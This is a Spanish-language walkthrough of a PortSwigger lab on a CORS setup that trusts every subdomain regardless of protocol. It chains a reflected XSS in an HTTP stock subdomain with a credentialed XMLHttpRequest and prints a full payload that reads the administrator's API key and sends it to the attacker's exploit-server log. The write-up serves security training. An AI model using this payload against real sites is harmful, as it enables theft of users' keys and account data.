---
title: "CORS vulnerability with trusted insecure protocols"
description: "Laboratorio de Portswigger sobre CORS"
date: 2025-04-06 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - CORS
tags:
  - Portswigger Labs
  - CORS
  - CORS vulnerability with trusted insecure protocols
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `sitio web` tiene una `configuración` de `Cross-Origin Resource Sharing (CORS)` insegura, debido a que `confía` en todos los `subdominios` sin importar el `protocolo`. Para `resolver` el `laboratorio`, debemos crear un `script` de `JavaScript` que use `Cross-Origin Resource Sharing (CORS)` para obtener la `clave API` del `administrador` y `subir` el `payload` a nuestro `servidor de explotación`. El `laboratorio` se considerará `resuelto` cuando `enviemos con éxito` la `clave API` del `administrador`. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las siguientes credenciales `wiener:peter`

---

## Guía de CORS

`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de CORS` [https://justice-reaper.github.io/posts/CORS-Guide/](https://justice-reaper.github.io/posts/CORS-Guide/)

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/CORS-Lab-3/image_1.png)

Si pulsamos en `View details` vemos que podemos `checkear` el `stock` del `producto` en diferentes `ciudades`

![](/assets/img/CORS-Lab-3/image_2.png)

Si pulsamos sobre `Check stock` nos `redirigirá` a `https://stock.0ae60051047d925c815bc08500f00081.web-security-academy.net/?productId=1&storeId=1` y nos `mostrará` el `stock` del `producto`

![](/assets/img/CORS-Lab-3/image_3.png)

Hacemos `click` sobre  `My account` y nos `logueamos` con las credenciales `wiener:peter`

![](/assets/img/CORS-Lab-3/image_4.png)

Vemos que podemos `cambiar` nuestro `email` y una clave `API`

![](/assets/img/CORS-Lab-3/image_5.png)

Si nos fijamos en la `petición` que se hace a `/accountDetails` cuando nos `logueamos`, veremos que el `servidor` nos `responde` con la cabecera `Access-Control-Allow-Credentials: true`. Esto `no lo hace vulnerable a CORS`, para que sea `vulnerable` tenemos que `ser capaces de controlar el origen de la petición`

![](/assets/img/CORS-Lab-3/image_6.png)

Para comprobar si podemos `manipular` el `origen` de la `petición` mandamos esta `petición` al `Repeater` y probamos a `añadir` las cabeceras `Origin: null` y `Origin: https://exploit-0a2f005e043492fb81bebfa3012e00eb.exploit-server.net/log`. En este caso `el servidor no nos deja manipular el origen`

![](/assets/img/CORS-Lab-3/image_7.png)

![](/assets/img/CORS-Lab-3/image_8.png)

Cuando `pulsamos` sobre `Check stock` vemos que la petición se hace desde un subdominio `https://stock.0ae60051047d925c815bc08500f00081.web-security-academy.net`

![](/assets/img/CORS-Lab-3/image_9.png)

Si probamos a `insertar` este `dominio` como `origen` si que `funciona` porque `está en la whitelist`

![](/assets/img/CORS-Lab-3/image_10.png)

La pulsar sobre la función de `Check stock` nos `redirige` a  `http://stock.0ae60051047d925c815bc08500f00081.web-security-academy.net/?productId=1&storeId=1`, si `inyectamos código JavaScript` en este `parámetro` de la URL `http://stock.0ae60051047d925c815bc08500f00081.web-security-academy.net/?productId=<script>alert(3)</script>&storeId=1` veremos que es `vulnerable` a `XSS`

![](/assets/img/CORS-Lab-3/image_11.png)

Una vez comprobado que ese `dominio` es `vulnerable` a `XSS` y que está en la `whitelist`, nos dirigimos al `Exploit server` y `pegamos` este `payload`

```
<script> document.location="http://stock.0ae60051047d925c815bc08500f00081.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ae60051047d925c815bc08500f00081.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='http://exploit-0a2f005e043492fb81bebfa3012e00eb.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```

![](/assets/img/CORS-Lab-3/image_12.png)

Pulsamos sobre `View exploit`, nos dirigimos al `Access log` y vemos que hemos obtenido `información` de nuestro `usuario`

![](/assets/img/CORS-Lab-3/image_13.png)

Una vez `comprobado` que `funciona`, pulsamos sobre `Deliver exploit to victim` y nos dirigimos al `Access log` nuevamente

![](/assets/img/CORS-Lab-3/image_14.png)

Copiamos la `cadena de texto` en el `Decoder` y la `URL decodeamos`

![](/assets/img/CORS-Lab-3/image_15.png)

Nos `copiamos` la `apiKey`, `pulsamos` sobre `Submit solution` y `completamos` el `laboratorio`

![](/assets/img/CORS-Lab-3/image_16.png)
